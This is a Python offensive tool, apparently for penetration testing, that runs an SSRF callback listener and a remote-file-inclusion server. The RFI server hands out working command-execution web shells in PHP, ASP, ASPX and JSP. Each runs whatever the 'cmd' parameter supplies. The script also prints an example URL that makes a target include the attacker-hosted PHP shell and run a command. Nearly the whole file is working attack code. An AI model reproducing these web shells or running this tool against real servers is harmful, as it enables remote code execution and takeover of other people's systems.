import http.server
import socketserver
import threading
import uuid
import time
import argparse
from urllib.parse import urlparse

SSRF_PORT = 8000
RFI_PORT = 9000

logs = {}

# =========================
# Payload Generator
# =========================
def generate_payload(base_url):
    token = str(uuid.uuid4())
    logs[token] = None
    return f"{base_url}/{token}", token

# =========================
# SSRF Handler
# =========================
class SSRFHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        token = self.path.strip("/")

        if token in logs:
            logs[token] = {
                "ip": self.client_address[0],
                "time": time.ctime()
            }

            print("\n[🔥 SSRF CALLBACK RECEIVED]")
            print(f"Token   : {token}")
            print(f"Source  : {self.client_address[0]}")
            print(f"Time    : {logs[token]['time']}")
            print("-" * 50)
        else:
            print(f"[INFO] Unknown request: {self.path}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

# =========================
# RFI Handler (Multi-language)
# =========================
class RFIHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        self.send_response(200)
        self.end_headers()

        # ===== PHP (Best RCE)
        if path.endswith(".php"):
            payload = b"""<?php
echo "START\\n";
$is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

if (!$cmd) {
    echo "NO_CMD";
} else {
    if ($is_windows) {
        $cmd = "cmd.exe /c " . $cmd;
    }

    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\\n", $output);
    } else {
        echo "NO_EXEC_FUNCTION";
    }
}
echo "\\nEND";
?>"""

        # ===== ASP (Classic)
        elif path.endswith(".asp"):
            payload = b"""<%
Response.Write("START<br>")
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd /c " & cmd)
    Response.Write(objExec.StdOut.ReadAll())
End If
Response.Write("<br>END")
%>"""

        # ===== ASPX
        elif path.endswith(".aspx"):
            payload = b"""<%@ Page Language="C#" %>
<%
Response.Write("START<br>");
string cmd = Request.QueryString["cmd"];
if(!String.IsNullOrEmpty(cmd)){
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    Response.Write(output);
}
Response.Write("<br>END");
%>"""

        # ===== JSP
        elif path.endswith(".jsp"):
            payload = b"""<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
out.println("START<br>");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = r.readLine()) != null){
        out.println(line + "<br>");
    }
}
out.println("END");
%>"""

        # ===== TXT (fallback)
        else:
            payload = b"RFI_TEST_SUCCESS"

        self.wfile.write(payload)

# =========================
# Server Threads
# =========================
def run_ssrf():
    with socketserver.TCPServer(("0.0.0.0", SSRF_PORT), SSRFHandler) as server:
        print(f"[+] SSRF Listener running on {SSRF_PORT}")
        server.serve_forever()

def run_rfi():
    with socketserver.TCPServer(("0.0.0.0", RFI_PORT), RFIHandler) as server:
        print(f"[+] RFI Server running on {RFI_PORT}")
        server.serve_forever()

# =========================
# Main
# =========================
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", required=True, help="Your internal IP")
    args = parser.parse_args()

    base_url = f"http://{args.ip}:{SSRF_PORT}"

    print("\n=== SSRF + RFI Multi-Payload Tool ===\n")

    # Start servers
    threading.Thread(target=run_ssrf, daemon=True).start()
    threading.Thread(target=run_rfi, daemon=True).start()

    time.sleep(1)

    # Generate SSRF payload
    payload, token = generate_payload(base_url)

    print("[🎯 SSRF PAYLOAD]")
    print(payload)

    print("\n[🧪 RFI PAYLOADS]")
    print(f"http://{args.ip}:{RFI_PORT}/rfi.php")
    print(f"http://{args.ip}:{RFI_PORT}/rfi.asp")
    print(f"http://{args.ip}:{RFI_PORT}/rfi.aspx")
    print(f"http://{args.ip}:{RFI_PORT}/rfi.jsp")
    print(f"http://{args.ip}:{RFI_PORT}/rfi.txt")

    print("\n[📌 TOKEN]")
    print(token)

    print("\n[💡 Example RCE]")
    print(f"http://target/page.php?file=http://{args.ip}:{RFI_PORT}/rfi.php&cmd=id")

    print("\n[⏳ Waiting for SSRF callbacks...]\n")

    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        print("\nExiting...")
